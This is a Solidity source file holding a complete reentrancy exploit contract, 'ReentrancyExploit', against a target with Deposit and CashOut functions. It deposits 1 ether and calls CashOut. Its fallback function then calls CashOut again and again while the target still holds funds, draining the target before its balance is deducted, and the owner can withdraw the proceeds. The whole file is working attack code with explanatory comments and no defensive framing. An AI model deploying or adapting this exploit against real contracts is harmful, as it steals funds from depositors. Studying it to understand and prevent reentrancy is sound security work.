pragma solidity ^0.4.19;

interface IVulnerable {
    function Deposit() external payable;
    function CashOut(uint _am) external;
}

contract ReentrancyExploit {
    IVulnerable public target;
    address public owner;
    uint public attackAmount = 1 ether;

    constructor(address _target) public payable {
        require(msg.value >= attackAmount);
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    function beginAttack() public {
        // Initial deposit to become a valid user
        target.Deposit.value(attackAmount)();
        // Start withdrawal (reentrant entry point)
        target.CashOut(attackAmount);
    }

    // Reentrancy point
    function () public payable {
        if (address(target).balance >= attackAmount) {
            target.CashOut(attackAmount); // recursively call again before balance deducted
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

